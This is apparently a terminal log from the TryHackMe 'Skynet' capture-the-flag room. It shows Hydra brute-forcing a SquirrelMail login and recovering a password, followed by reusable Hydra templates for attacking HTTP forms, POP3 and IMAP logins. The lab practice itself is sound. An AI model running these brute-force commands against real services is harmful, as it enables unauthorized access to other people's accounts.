┌──(sevenoffsec㉿antivenom)-[~/ctf/thm/linux/skynet]
└─$ hydra -l milesdyson -P log1.txt skynet.thm http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:incorrect" -t 20
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-06 14:35:14
[DATA] max 20 tasks per 1 server, overall 20 tasks, 31 login tries (l:1/p:31), ~2 tries per task
[DATA] attacking http-post-form://skynet.thm:80/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:incorrect
[80][http-post-form] host: skynet.thm   login: milesdyson   password: cyborg007haloterminator
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-06 14:35:39


```
hydra -l username -P password_list.txt -f -V -s port http-post-form "/path:field1=^USER^&field2=^PASS^:failure_string"

hydra -l username -P password_list.txt -f -V -t 4 -w 2 pop3://target_ip:110

hydra -l username -P password_list.txt -f -V imap://skynet.thm:143

hydra -S -l username -P password_list.txt -f -V imap://skynet.thm:993


```